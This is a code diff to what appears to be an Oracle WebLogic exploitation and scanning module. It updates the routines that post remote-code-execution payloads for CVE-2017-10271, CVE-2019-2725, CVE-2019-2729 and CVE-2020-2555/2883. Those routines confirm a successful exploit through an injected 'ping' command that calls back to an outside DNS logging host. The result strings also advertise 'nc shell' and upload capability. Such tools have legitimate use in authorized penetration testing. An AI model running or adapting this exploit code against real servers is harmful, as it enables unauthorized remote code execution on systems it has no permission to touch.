@@ -3,7 +3,7 @@
 import re
 import time
 import socket
-import requests
+from thirdparty import requests
 import threading
 from module.time import now
 from module.color import color
@@ -11,10 +11,10 @@ from module.allcheck import os_check
 from module import globals
 from core.verify import verify
 from module.md5 import random_md5
-from requests.packages import urllib3
 from urllib.parse import urlparse
-from requests_toolbelt.utils import dump
-urllib3.disable_warnings()
+from core.verify import misinformation
+from thirdparty.requests_toolbelt.utils import dump
+from module.api.dns import dns_result, dns_request
 
 
 class OracleWeblogic():
@@ -25,11 +25,10 @@ class OracleWeblogic():
         self.delay = globals.get_value("DELAY")  # 获取全局变量UA
         self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
         self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
-        self.ceye_domain = globals.get_value("ceye_domain")
-        self.ceye_token = globals.get_value("ceye_token")
-        self.ceye_api = globals.get_value("ceye_api")
         self.threadLock = threading.Lock()
         self.url = url
+        if self.url[-1] == "/":
+            self.url = self.url[:-1]
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
         self.port = self.getipport.port
@@ -11441,7 +11440,7 @@ class OracleWeblogic():
             self.request = requests.post(self.url + "/wls-wsat/CoordinatorPortType",
                                          data=self.payload_cve_2017_10271_rce, headers=self.headers_rce,
                                          timeout=self.timeout, verify=False)
-            if md in self.request.text:
+            if md in misinformation(self.request.text, md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["prt_info"] = "[rce] [nc shell] [upload] [poc: " + cmd  + " ]"
@@ -11638,7 +11637,7 @@ class OracleWeblogic():
                 self.payload = self.payload_cve_2019_2725_rce_10
             self.request = requests.post(self.url + "/wls-wsat/CoordinatorPortType", data=self.payload,
                                          headers=self.headers_rce, timeout=self.timeout, verify=False)
-            if md in self.request.text:
+            if md in misinformation(self.request.text, md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["prt_info"] = "[nc shell] [upload] [url: " + self.url + "/wls-wsat/CoordinatorPortType" + " ]"
@@ -11752,7 +11751,7 @@ class OracleWeblogic():
         try:
             self.request = requests.post(self.url + self.path, data=self.payload_cve_2019_2729, headers=headers,
                                          timeout=self.timeout, verify=False)
-            if md in self.request.text:
+            if md in misinformation(self.request.text, md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["prt_info"] = "[nc shell] [upload] [url: " + self.url + self.path + " ]"
@@ -11839,8 +11838,8 @@ class OracleWeblogic():
         except socket.timeout:
             verify.timeout_print(self.vul_info["prt_name"])
         except Exception as error:
-            print(now.timed(de=0) + color.red(
-                "[ERROR]" + error.__traceback__.tb_frame.f_globals['__file__'] + str(error.__traceback__.tb_lineno)))
+            #print(now.timed(de=0) + color.red(
+            #    "[ERROR]" + error.__traceback__.tb_frame.f_globals['__file__'] + str(error.__traceback__.tb_lineno)))
             verify.error_print(self.vul_info["prt_name"])
         self.threadLock.release()
 
@@ -11864,8 +11863,8 @@ class OracleWeblogic():
         self.vul_info["cre_date"] = "2021-01-22"
         self.vul_info["cre_auth"] = "zhzyker"
         raw_data = ">_< Vuln CVE-2020-2555 send using giop protocol. So no http request and response"
-        md = random_md5()
-        cmd = "ping " + md + "." + self.ceye_domain
+        md = dns_request()
+        cmd = "ping " + md
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(self.timeout)
@@ -11936,12 +11935,11 @@ class OracleWeblogic():
             time.sleep(1)
             sock.send(bytes.fromhex(self.payload))
             time.sleep(1)
-            request = requests.get(self.ceye_api + self.ceye_token)
-            if md in request.text:
+            if dns_result(md):
                 self.vul_info["vul_data"] = raw_data
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = cmd
-                self.vul_info["prt_info"] = "[ceye] [t3] [cmd:" + cmd + "] "
+                self.vul_info["prt_info"] = "[dns] [t3] [cmd:" + cmd + "] "
             verify.scan_print(self.vul_info)
         except socket.timeout:
             verify.timeout_print(self.vul_info["prt_name"])
@@ -12046,8 +12044,8 @@ class OracleWeblogic():
         self.vul_info["cre_date"] = "2021-01-22"
         self.vul_info["cre_auth"] = "zhzyker"
         raw_data = ">_< Vuln CVE-2020-2883 send using giop protocol. So no http request and response"
-        md = random_md5()
-        cmd = "ping " + md + "." + self.ceye_domain
+        md = dns_request()
+        cmd = "ping " + md
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(self.timeout)
@@ -12073,12 +12071,11 @@ class OracleWeblogic():
             sock.send(bytes.fromhex(self.payload))
             # sock.close()
             time.sleep(1)
-            request = requests.get(self.ceye_api + self.ceye_token)
-            if md in request.text:
+            if dns_result(md):
                 self.vul_info["vul_data"] = raw_data
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = cmd
-                self.vul_info["prt_info"] = "[ceye] [giop] [cmd:" + cmd + "] "
+                self.vul_info["prt_info"] = "[dns] [giop] [cmd:" + cmd + "] "
             verify.scan_print(self.vul_info)
         except socket.timeout:
             verify.timeout_print(self.vul_info["prt_name"])
